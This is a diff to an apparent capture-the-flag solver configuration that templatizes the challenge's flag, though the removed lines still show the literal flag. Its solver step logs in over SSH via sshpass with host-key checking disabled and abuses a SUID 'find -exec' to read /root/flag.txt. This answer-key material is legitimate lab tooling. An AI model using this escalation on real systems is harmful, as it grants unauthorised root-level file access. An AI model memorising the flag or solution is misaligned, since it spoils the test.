@@ -25,10 +25,10 @@ solver:
     command: sshpass -p '{cred.analyst.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.analyst.user}@{target.target} 'find . -exec cat /root/flag.txt \; -quit' 2>&1
     expect: p01s0n
   - name: Assemble and verify the complete flag
-    command: echo 'OCR{su1d_m4z3_p01s0n}'
+    command: echo '{flag}'
     expect: OCR{
 expected_flag_count: 1
-expected_flag: OCR{su1d_m4z3_p01s0n}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
